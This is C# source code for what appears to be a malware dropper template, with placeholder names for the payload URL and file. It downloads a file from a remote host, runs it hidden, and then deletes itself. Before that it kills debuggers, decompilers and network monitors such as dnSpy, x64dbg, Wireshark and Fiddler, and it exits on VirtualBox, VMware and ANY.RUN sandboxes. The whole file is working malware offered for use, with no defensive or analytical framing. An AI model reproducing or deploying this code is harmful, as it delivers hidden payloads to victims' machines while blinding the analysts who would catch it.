using System;
using System.IO;
using System.Net;
using System.Diagnostics;

namespace SimplyProgram
{
    internal class Program
    {
        static void Main(string[] args)
        {

            CallbackDtc();
            AntiDbg();


            string remoteUrl = "KINGURL";
            string tempFilePath = Path.Combine(Path.GetTempPath(), "KING_PROGRAM_NAME");

            try
            {
                using (WebClient webClient = new WebClient())
                {
                    webClient.DownloadFile(remoteUrl, tempFilePath);

                    ProcessStartInfo psi = new ProcessStartInfo
                    {
                        FileName = tempFilePath,
                        CreateNoWindow = true,
                        WindowStyle = ProcessWindowStyle.Hidden
                    };

                    Process.Start(psi);

                    AutoSelfDel();
                }
            }
            catch
            {
                AutoSelfDel();
            }
        }


        private static void CallbackDtc()
        {
            bool isVM = AntiVM_Checker();
            if (isVM == true)
            {
                AutoSelfDel();
            }

            if (AnyRunDtc())
            {
                AutoSelfDel();
            }
        }

        private static void AutoSelfDel()
        {
            var fileName = Process.GetCurrentProcess().MainModule.FileName;
            int delaySecond = 1;
            fileName = Path.GetFullPath(fileName);
            var folder = Path.GetDirectoryName(fileName);
            var currentProcessFileName = Path.GetFileName(fileName);

            var arguments = $"/c timeout /t {delaySecond} && DEL /f {currentProcessFileName} ";

            var processStartInfo = new ProcessStartInfo()
            {
                FileName = "cmd",
                UseShellExecute = false,
                CreateNoWindow = true,
                Arguments = arguments,
                WorkingDirectory = folder,
            };

            Process.Start(processStartInfo);
        }


        public static bool AntiDbg()
        {
            string[] forbiddenProcesses = {
                "dnspy", "Mega Dumper", "Dumper", "PE-bear", "de4dot", "TCPView", "Resource Hacker", "Pestudio", "HxD", "Scylla",
                "de4dot", "PE-bear", "Fakenet-NG", "ProcessExplorer", "SoftICE", "ILSpy", "dump", "proxy", "de4dotmodded", "StringDecryptor",
                "Centos", "SAE", "monitor", "brute", "checker", "zed", "sniffer", "http", "debugger", "james",
                "exeinfope", "codecracker", "x32dbg", "x64dbg", "ollydbg", "ida -", "charles", "dnspy", "simpleassembly", "peek",
                "httpanalyzer", "httpdebug", "fiddler", "wireshark", "dbx", "mdbg", "gdb", "windbg", "dbgclr", "kdb",
                "kgdb", "mdb", "ollydbg", "dumper", "wireshark", "httpdebugger", "http debugger", "fiddler", "decompiler", "unpacker",
                "deobfuscator", "de4dot", "confuser", " /snd", "x64dbg", "x32dbg", "x96dbg", "process hacker", "dotpeek", ".net reflector",
                "ilspy", "file monitoring", "file monitor", "files monitor", "netsharemonitor", "fileactivitywatcher", "fileactivitywatch", "windows explorer tracker", "process monitor", "disk pluse",
                "file activity monitor", "fileactivitymonitor", "file access monitor", "mtail", "snaketail", "tail -n", "httpnetworksniffer", "microsoft message analyzer", "networkmonitor", "network monitor",
                "soap monitor", "internet traffic agent", "socketsniff", "networkminer", "network debugger", "HTTPDebuggerUI", "mitmproxy", "python", "mitm", "Wireshark","UninstallTool", "UninstallToolHelper", "ProcessHacker",
            };

            foreach (var processName in forbiddenProcesses)
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                {
                    foreach (var process in processes)
                    {
                        try
                        {
                            process.Kill();
                        }
                        catch
                        {
                            //
                        }

                    }
                    return true;
                }
            }

            return false;
        }

        private static bool AntiVM_Checker()
        {
            string[] vmProcesses = {
            "vmtoolsd", "vmwaretray", "vmwareuser", "vgauthservice", "vmacthlp",
            "vmsrvc", "vmusrvc", "prl_cc", "prl_tools", "xenservice", "qemu-ga", "joeboxcontrol",
            "ksdumperclient", "ksdumper", "joeboxserver", "vmwareservice", "vmwaretray", "VBoxService",
            "VBoxTray",
            };

            foreach (var processName in vmProcesses)
            {
                var processes = Process.GetProcessesByName(processName);
                if (processes.Length > 0)
                {
                    foreach (var process in processes)
                    {
                        AutoSelfDel();
                    }
                    return true;
                }
            }
            return false;
        }


        public static bool AnyRunDtc()
        {
            string[] array = { "Acrobat Reader DC.lnk", "CCleaner.lnk", "FileZilla Client.lnk", "Firefox.lnk", "Google Chrome.lnk",  "Skype.lnk", "Microsoft Edge.lnk" };

            foreach (string fileName in array)
            {
                if (!File.Exists(Path.Combine(Environment.ExpandEnvironmentVariables("%systemdrive%"), "Users", "Public", "Desktop", fileName)))
                {
                    return false;
                }
            }

            if (string.Equals(Environment.UserName.ToLower(), "admin", StringComparison.OrdinalIgnoreCase) && Environment.MachineName.Contains("USER-PC"))
            {
                return true;
            }

            return false;
        }


    }
}
